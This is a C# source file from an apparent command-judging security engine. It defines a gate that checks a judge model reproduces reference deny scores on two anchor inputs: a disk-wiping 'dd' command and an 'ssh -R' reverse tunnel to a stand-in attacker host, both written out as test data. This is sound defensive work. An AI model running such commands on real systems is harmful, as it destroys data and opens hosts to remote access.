

namespace ProvostXInference.Decision.Engine;

/// <summary>
/// Canonical numerics gate (LLM-10): before a NON-CPU execution provider is
/// accepted, the judge model must reproduce the canonical wave-4 anchor (the
/// destructive `dd` deny — recorded on the CPU EP: deny EXACT, conf ≈ 0.9231,
/// risk ≈ 3.128) within tolerance. A GPU/CoreML EP that loads but drifts the
/// anchors is REJECTED and the chain continues to the next provider (cpu always
/// terminates). Fail-closed: gate evaluation errors count as drift.
/// </summary>
public sealed record JudgeNumericsGate
{
    public const double DefaultTolerance = 0.02;

    public required DecisionRecord Record { get; init; }
    public JudgeAction ExpectedAction { get; init; }
    public double ExpectedConfidence { get; init; }
    public double ExpectedRisk { get; init; }
    public double Tolerance { get; init; } = DefaultTolerance;

    /// <summary>Canonical shell anchor: `sudo dd if=/dev/zero of=/dev/sda`
    /// (cwd /) — deny, conf 0.9231, risk 3.1279 (ORT CPU reference / wave-4
    /// live smoke).</summary>
    public static JudgeNumericsGate Shell() => new()
    {
        Record = new DecisionRecord
        {
            Kind = JudgeRecordKind.Shell,
            Command = "sudo dd if=/dev/zero of=/dev/sda",
            Cwd = "/",
        },
        ExpectedAction = JudgeAction.Deny,
        ExpectedConfidence = 0.9231,
        ExpectedRisk = 3.1279,
    };

    /// <summary>Canonical process anchor: ssh remote-relay — deny, conf 0.9835,
    /// risk 2.823 (ORT CPU reference).</summary>
    public static JudgeNumericsGate Process() => new()
    {
        Record = new DecisionRecord
        {
            Kind = JudgeRecordKind.Process,
            Os = "linux",
            Exe = "ssh",
            Chain = new[] { "www-data", "bash", "ssh" },
            Cmd = "ssh -R 9999:localhost:22 evil@relay.sh",
            Net = "relay.sh:22",
        },
        ExpectedAction = JudgeAction.Deny,
        ExpectedConfidence = 0.9835,
        ExpectedRisk = 2.823,
    };

    /// <summary>Gate for a configured judge kind ("shell" | "process"); null for
    /// unknown kinds (cpu-only chains never need it — the cpu path skips gating).</summary>
    public static JudgeNumericsGate? ForKind(string? judgeKind) => judgeKind?.Trim().ToLowerInvariant() switch
    {
        "shell" => Shell(),
        "process" => Process(),
        _ => null,
    };

    /// <summary>Typed-kind overload (the engine carries JudgeRecordKind).</summary>
    public static JudgeNumericsGate? ForKind(JudgeRecordKind kind) => kind switch
    {
        JudgeRecordKind.Shell => Shell(),
        JudgeRecordKind.Process => Process(),
        _ => null,
    };

    /// <summary>True when a score satisfies the gate. Pure function.</summary>
    public bool IsSatisfied(JudgeScore score) =>
        score.RawAction == ExpectedAction
        && Math.Abs(score.Confidence - ExpectedConfidence) <= Tolerance
        && Math.Abs(score.Risk - ExpectedRisk) <= Tolerance;
}
